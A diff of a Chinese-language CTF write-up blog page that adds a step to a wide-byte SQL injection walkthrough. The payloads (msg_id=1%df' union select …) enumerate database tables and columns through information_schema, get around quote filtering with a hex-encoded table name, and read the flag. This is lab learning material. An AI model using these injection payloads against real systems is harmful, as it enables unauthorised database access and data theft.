@@ -71,7 +71,7 @@
 <meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/week05_02_01.png">
 <meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/week05_02_02.png">
 <meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/week05_03_01.png">
-<meta property="og:updated_time" content="2017-12-16T15:51:46.213Z">
+<meta property="og:updated_time" content="2017-12-17T13:18:21.894Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="week 5 for cnas writeup">
 <meta name="twitter:description" content="点击阅读全文">
@@ -373,6 +373,9 @@ var _hmt = _hmt || [];
 <p>得到当前数据库：week05_03</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</div></pre></td></tr></table></figure>
 <p>得到当前数据库的表名：flag,msg_book</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #(flag的十六进制)</div></pre></td></tr></table></figure>
+<p>这里因为单引号被过滤了，所以要用十六进制</p>
+<p>得到列名：flag</p>
 <p>最后直接</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,flag from flag #</div></pre></td></tr></table></figure>
 <p>发现自己手注的过程还是不熟悉，需要多多练习</p>
